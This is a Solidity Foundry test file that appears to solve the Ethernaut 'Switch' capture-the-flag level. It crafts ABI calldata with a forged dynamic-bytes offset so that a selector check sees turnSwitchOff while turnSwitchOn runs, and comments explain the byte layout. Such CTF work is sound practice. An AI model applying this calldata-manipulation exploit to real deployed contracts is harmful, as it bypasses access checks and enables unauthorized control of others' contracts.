// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "contracts/29_switch.sol";
// https://docs.soliditylang.org/en/latest/abi-spec.html#formal-specification-of-the-encoding
contract SwitchSolver {
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));//0x20606e15
    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()"));//0x76227e12
    bytes4 public flipSelector = 0x30c13ade;//0x30c13ade
    function solve(Switch sw) public {
        // the bytes solution would look like this. [func_selector,dynamic bytes data offset location,offSelector, (pointer data start here) onSelector]
        // 4 bytes selector, index start length 0x60, offSelector to bypass, length of bytes =4 bytes, onSelector function to call
        bytes memory testEncode = abi.encodeWithSelector(flipSelector,uint256(32*3),type(uint256).max, offSelector, uint256(4),onSelector );
        console.log("testEncode");
        console.logBytes(testEncode);
        //original encoded with bytes: 0x30c13ade //func selector
        //0000000000000000000000000000000000000000000000000000000000000020// start location 0x20 = 32*2
        //000000000000000000000000000000000000000000000000000000000000000c// bytes length = 12
        //20606e1500000000000000000000000000000000000000000000000000000000// bytes data

        //0x30c13ade
        //0000000000000000000000000000000000000000000000000000000000000040
        //20606e1500000000000000000000000000000000000000000000000000000000
        //0000000000000000000000000000000000000000000000000000000000000004
        //76227e1200000000000000000000000000000000000000000000000000000000

        // sw.flipSwitch(testEncode);
        (bool success,) = address(sw).call(testEncode);
        require(success, "call failed");
    }
}
//0x30c13ade 0000000000000000000000000000000000000000000000000000000000000020 00000000000000000000000000000000000000000000000000000000000000
//0x30c13ade00000000000000000000000000000000000000000000000000000000
contract SwitchTest is Test {
    Switch sw;
    function setUp() public {
        sw = new Switch();
    }

    function test_switchOn() public {
        SwitchSolver solver = new SwitchSolver();
        solver.solve(sw);
        assertEq(sw.switchOn(), true);
    }
}
